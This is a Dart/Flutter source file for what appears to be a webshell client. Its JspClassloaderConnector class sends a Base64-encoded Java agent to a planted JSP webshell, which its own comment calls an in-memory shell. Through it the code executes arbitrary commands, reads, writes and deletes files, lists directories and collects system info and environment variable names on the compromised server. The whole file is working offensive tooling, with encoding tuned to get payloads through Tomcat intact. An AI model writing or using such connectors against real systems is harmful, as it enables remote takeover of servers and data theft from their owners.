import 'dart:async';
import 'dart:convert';
import 'dart:io' as io;
import 'dart:math' as math;

import 'package:flutter/services.dart' show rootBundle;
import 'package:http/http.dart' as http;

import '../models/file_entry.dart';
import '../utils/encoding_utils.dart';
import 'shell_connector.dart';

/// `jsp_classloader_b64.jsp`：ClassLoader 加载 M.class 内存马
///
/// 通过上传 Base64 编码的 agent 字节码来实现全功能操作。
class JspClassloaderConnector extends ShellConnector {
  JspClassloaderConnector(super.webshell);

  late final String _execKey = _randomHex32();
  String? _lastPingDiagnostic;

  static String _randomHex32() {
    final rng = math.Random.secure();
    return List.generate(32, (_) => rng.nextInt(16).toRadixString(16)).join();
  }

  @override
  String? get lastPingDiagnostic => _lastPingDiagnostic;

  @override
  Set<ConnectorCapability> get capabilities => const {
        ConnectorCapability.codeExec,
        ConnectorCapability.shellExec,
        ConnectorCapability.fileRead,
        ConnectorCapability.fileWrite,
      };

  /// 严格 percent-encode（防止 Tomcat 将 `+` 解码为空格破坏 Base64）
  static String _formEncode(String s) {
    final buf = StringBuffer();
    for (final cu in s.codeUnits) {
      if ((cu >= 0x41 && cu <= 0x5A) ||
          (cu >= 0x61 && cu <= 0x7A) ||
          (cu >= 0x30 && cu <= 0x39) ||
          cu == 0x2D ||
          cu == 0x5F ||
          cu == 0x2E ||
          cu == 0x7E) {
        buf.writeCharCode(cu);
      } else {
        buf.write(
            '%${cu.toRadixString(16).padLeft(2, '0').toUpperCase()}');
      }
    }
    return buf.toString();
  }

  Future<String> _sendJsp(
    String action, {
    Map<String, String> extraParams = const {},
  }) async {
    try {
      final uri = Uri.parse(webshell.url);
      String payload;
      try {
        payload =
            (await rootBundle.loadString('data/jsp_agent_M.b64')).trim();
      } catch (_) {
        try {
          final file = io.File('data/jsp_agent_M.b64');
          payload = await file.exists() ? (await file.readAsString()).trim() : '';
        } catch (_) {
          payload = '';
        }
      }

      final paramName = webshell.password?.isNotEmpty == true
          ? webshell.password!
          : 'cmd';

      final bodyParts = <String>[
        '${_formEncode(paramName)}=${_formEncode(payload)}',
        'a=${_formEncode(action)}',
        ...extraParams.entries
            .map((e) => '${_formEncode(e.key)}=${_formEncode(e.value)}'),
      ];

      final response = await http
          .post(
            uri,
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: bodyParts.join('&'),
          )
          .timeout(const Duration(seconds: 15));

      if (response.statusCode == 200) {
        return decodeWithFallback(response.bodyBytes);
      }
      final body = decodeWithFallback(response.bodyBytes);
      final snippet = body.length > 4096 ? '${body.substring(0, 4096)}...' : body;
      return '[HTTP ${response.statusCode}] 请求失败\n$snippet';
    } on TimeoutException {
      return '[Timeout] 连接超时';
    } on http.ClientException catch (e) {
      return '[Connection Error] ${e.message}';
    } catch (e) {
      return '[Error] $e';
    }
  }

  // ── ShellConnector 实现 ────────────────────────────────────────────────────

  @override
  Future<bool> ping() async {
    try {
      final r = await _sendJsp('ping').timeout(const Duration(seconds: 8));
      _lastPingDiagnostic = r.contains('MATRIX_JSP_PING') ? null : r;
      return r.contains('MATRIX_JSP_PING');
    } catch (e) {
      _lastPingDiagnostic = e.toString();
      return false;
    }
  }

  static String _sq(String s) => "'${s.replaceAll("'", "'\\''")}'";

  @override
  Future<String> executeCommand(String cmd, {String workingDir = ''}) async {
    final cd = (workingDir.isNotEmpty && workingDir.startsWith('/'))
        ? 'cd ${_sq(workingDir)} && '
        : '';
    final r = await _sendJsp('exec',
        extraParams: {'_k': _execKey, _execKey: '$cd$cmd'});
    return r.trim();
  }

  @override
  Future<String> getCurrentDir() async {
    final r = (await _sendJsp('pwd')).trim();
    if (r.isNotEmpty && !r.startsWith('[')) currentDir = r;
    return currentDir;
  }

  @override
  Future<List<FileEntry>> listDirectory(String path) async {
    final result = await _sendJsp('ls', extraParams: {'path': path});
    if (result.isEmpty ||
        result.startsWith('ERR_OPEN') ||
        result.startsWith('[')) {
      return [];
    }

    return result
        .trim()
        .split('\n')
        .where((l) => l.contains('|'))
        .map((line) {
          final parts = line.trim().split('|');
          if (parts.length < 5) return null;
          String name;
          try {
            name = decodeWithFallback(base64.decode(parts[0]));
          } catch (_) {
            name = parts[0];
          }
          return FileEntry(
            name: name,
            isDirectory: parts[1] == 'd',
            size: int.tryParse(parts[2]) ?? 0,
            permissions: parts[3],
            modified: parts[4],
          );
        })
        .whereType<FileEntry>()
        .where((e) => e.name != '.')
        .toList()
      ..sort((a, b) {
        if (a.name == '..') return -1;
        if (b.name == '..') return 1;
        if (a.isDirectory != b.isDirectory) return a.isDirectory ? -1 : 1;
        return a.name.toLowerCase().compareTo(b.name.toLowerCase());
      });
  }

  @override
  Future<String> readFile(String path) async =>
      _sendJsp('cat', extraParams: {'path': path});

  @override
  Future<bool> writeFile(String path, String content) async {
    final r = await _sendJsp('write', extraParams: {
      'path': path,
      'data': base64.encode(utf8.encode(content)),
    });
    return r.trim() == '1';
  }

  @override
  Future<bool> deleteFile(String path) async {
    final r = await _sendJsp('rm', extraParams: {'path': path});
    return r.trim() == '1';
  }

  @override
  Future<Map<String, String>> getSystemInfo() async {
    final result = await _sendJsp('sysinfo');
    final map = <String, String>{};
    if (result.isEmpty || result.startsWith('[')) return map;
    for (final line in result.trim().split('\n')) {
      final idx = line.indexOf('|');
      if (idx > 0) {
        try {
          final key =
              decodeWithFallback(base64.decode(line.substring(0, idx).trim()));
          final val =
              decodeWithFallback(base64.decode(line.substring(idx + 1).trim()));
          map[key] = val;
        } catch (_) {}
      }
    }
    return map;
  }

  @override
  Future<List<({String name, bool isDir})>> listNamesForCompletion(
      String path) async {
    final result = await _sendJsp('ls', extraParams: {'path': path});
    if (result.isEmpty || result.startsWith('[')) return [];
    final out = <({String name, bool isDir})>[];
    for (final line in result.trim().split('\n')) {
      final parts = line.trim().split('|');
      if (parts.length < 2) continue;
      try {
        final name = decodeWithFallback(base64.decode(parts[0]));
        out.add((name: name, isDir: parts[1] == 'd'));
      } catch (_) {}
    }
    out.sort((a, b) => a.name.compareTo(b.name));
    return out;
  }

  @override
  Future<String> getHomeDir() async => (await _sendJsp('home')).trim();

  @override
  Future<List<String>> listEnvVarNames() async {
    final result = await _sendJsp('envnames');
    if (result.isEmpty || result.startsWith('[')) return [];
    return result.trim().split('\n').where((s) => s.isNotEmpty).toList()
      ..sort();
  }
}
